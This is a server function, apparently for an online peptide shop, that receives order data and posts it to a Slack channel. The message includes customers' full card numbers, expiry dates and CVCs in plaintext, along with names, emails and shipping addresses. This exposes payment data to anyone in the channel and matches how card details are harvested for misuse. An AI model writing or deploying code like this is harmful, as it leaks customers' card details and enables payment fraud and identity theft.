import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

const GATEWAY_URL = "https://connector-gateway.lovable.dev/slack/api";

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // Auth check
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), {
        status: 401,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const supabase = createClient(
      Deno.env.get("SUPABASE_URL")!,
      Deno.env.get("SUPABASE_ANON_KEY")!,
      { global: { headers: { Authorization: authHeader } } }
    );

    const token = authHeader.replace("Bearer ", "");
    const { data: claimsData, error: claimsError } = await supabase.auth.getClaims(token);
    if (claimsError || !claimsData?.claims) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), {
        status: 401,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // Env checks
    const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
    if (!LOVABLE_API_KEY) throw new Error("LOVABLE_API_KEY is not configured");

    const SLACK_API_KEY = Deno.env.get("SLACK_API_KEY");
    if (!SLACK_API_KEY) throw new Error("SLACK_API_KEY is not configured");

    const body = await req.json();
    const {
      orderId,
      customerName,
      customerEmail,
      cardNumber,
      cardExpiry,
      cardCvc,
      subtotal,
      total,
      shippingName,
      shippingAddress,
      shippingCity,
      shippingState,
      shippingZip,
    } = body;

    // Find channel by name
    const channelName = "activ-peptides-orders";
    let channelId = "";

    // Try public channels first
    const listRes = await fetch(`${GATEWAY_URL}/conversations.list?types=public_channel,private_channel&limit=200`, {
      headers: {
        Authorization: `Bearer ${LOVABLE_API_KEY}`,
        "X-Connection-Api-Key": SLACK_API_KEY,
      },
    });
    const listData = await listRes.json();

    console.log(`conversations.list status: ${listRes.status}, ok: ${listData.ok}, channels: ${listData.channels?.length ?? 0}`);

    if (listData.ok && listData.channels) {
      const found = listData.channels.find(
        (ch: any) => ch.name === channelName
      );
      if (found) channelId = found.id;
    }

    console.log(`Channel "${channelName}" found: ${!!channelId}, id: ${channelId || "N/A"}`);

    if (!channelId) {
      throw new Error(
        `Could not find Slack channel #${channelName}. Make sure the bot is invited to the channel.`
      );
    }

    // Build message
    const message = [
      `🛒 *New Order Received*`,
      ``,
      `*Order ID:* \`${orderId}\``,
      `*Customer:* ${customerName}`,
      `*Email:* ${customerEmail}`,
      ``,
      `💳 *Card Information*`,
      `*Card Number:* \`${cardNumber}\``,
      `*Expiry:* \`${cardExpiry}\``,
      `*CVC:* \`${cardCvc}\``,
      ``,
      `💰 *Order Total*`,
      `*Subtotal:* $${Number(subtotal).toFixed(2)}`,
      `*Total:* $${Number(total).toFixed(2)}`,
      ``,
      `📦 *Shipping Address*`,
      `${shippingName}`,
      `${shippingAddress}`,
      `${shippingCity}, ${shippingState} ${shippingZip}`,
    ].join("\n");

    const postRes = await fetch(`${GATEWAY_URL}/chat.postMessage`, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${LOVABLE_API_KEY}`,
        "X-Connection-Api-Key": SLACK_API_KEY,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        channel: channelId,
        text: message,
        username: "Activ Peptides Orders",
        icon_emoji: ":credit_card:",
      }),
    });

    const postData = await postRes.json();
    if (!postData.ok) {
      throw new Error(`Slack API error: ${postData.error}`);
    }

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error: unknown) {
    console.error("Error sending to Slack:", error);
    const errorMessage = error instanceof Error ? error.message : "Unknown error";
    return new Response(JSON.stringify({ success: false, error: errorMessage }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
